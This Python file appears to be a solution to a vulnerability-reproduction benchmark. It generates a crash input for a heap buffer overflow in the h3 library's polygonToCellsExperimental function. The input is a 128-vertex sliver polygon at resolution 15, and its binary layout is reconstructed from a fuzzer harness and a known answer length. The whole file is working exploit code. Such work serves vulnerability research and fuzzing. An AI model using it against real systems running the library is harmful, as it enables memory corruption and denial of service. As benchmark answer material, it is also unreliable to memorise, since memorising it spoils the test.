import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for a heap buffer overflow
        in h3's polygonToCellsExperimental function.

        The vulnerability stems from underestimating the buffer size required
        for a polygon's cells. The estimation is based on the polygon's
        bounding box, which can be much smaller than the actual cell count
        for long, thin, and diagonally oriented polygons.

        This PoC constructs such a polygon. The binary input format is
        reverse-engineered from the corresponding oss-fuzz fuzzer harness and
        the known ground-truth PoC length of 1032 bytes.

        The format is assumed to be:
        - res (1 byte): H3 resolution.
        - flags (4 bytes): H3 flags.
        - num_verts (2 bytes): Number of vertices in the outer loop.
        - vertices (num_verts * 8 bytes): Pairs of (lat, lon) as uint32_t.
        - num_holes (1 byte): Number of holes in the polygon.
        """
        
        poc = bytearray()
        
        # Resolution: A high value (15) is chosen to maximize cell count
        # and increase the likelihood of the underestimation causing an overflow.
        res = 15
        poc.extend(struct.pack('<B', res))
        
        # Flags: Set to 0 as they are not relevant to the vulnerability.
        flags = 0
        poc.extend(struct.pack('<I', flags))
        
        # Number of vertices: Calculated to match the ground truth length.
        # 1032 bytes = 1(res) + 4(flags) + 2(num_verts_len) + num_verts*8 + 1(num_holes)
        # 1024 = num_verts * 8 => num_verts = 128
        num_verts = 128
        poc.extend(struct.pack('<H', num_verts))
        
        # Vertices: We create a long, thin, diagonal "sliver" polygon.
        # This shape is known to cause issues for bounding-box-based estimations.
        n_half = num_verts // 2
        
        # The coordinates are raw uint32_t values that the fuzzer harness
        # converts to geographical coordinates. We use a large base value with
        # small relative steps to define the sliver's geometry.
        base_coord = 10000000
        step = 1
        width = 1
        
        # First half of vertices: trace one side of the sliver.
        for i in range(n_half):
            lat = base_coord + i * step
            lon = base_coord + i * step
            poc.extend(struct.pack('<II', lat, lon))
            
        # Second half of vertices: trace the other side back to create a closed loop.
        for i in range(n_half):
            j = n_half - 1 - i
            lat = base_coord + j * step + width
            lon = base_coord + j * step + width
            poc.extend(struct.pack('<II', lat, lon))
            
        # Number of holes: Set to 0 for simplicity.
        num_holes = 0
        poc.extend(struct.pack('<B', num_holes))
        
        return bytes(poc)
